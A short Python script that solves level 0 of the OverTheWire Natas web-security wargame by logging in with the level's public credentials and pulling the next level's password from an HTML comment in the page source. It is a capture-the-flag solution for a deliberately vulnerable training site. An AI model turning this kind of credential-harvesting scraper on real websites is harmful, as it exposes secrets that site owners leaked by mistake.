#!/usr/bin/env python3
# Vulnerability: Sensitive information disclosure in the source code

import requests
import re
from bs4 import BeautifulSoup, Comment
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas0'
password = username


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org'


# Make a GET request to the URL with basic authentication using the provided credentials
resp = requests.get(url=url, auth=(username, password))


# Parse the HTML content of the response using BeautifulSoup
soup = BeautifulSoup(resp.text, 'lxml')


# Extract password for the next level
# Method 1: BeautifulSoup Approach using Comment class
comment_tag = soup.find_all(string=lambda text: isinstance(text, Comment))[-1]
print(comment_tag.strip())


# Method 2: Regular Expressions
# print(re.findall('<!--(.*) -->', resp.text)[-1])
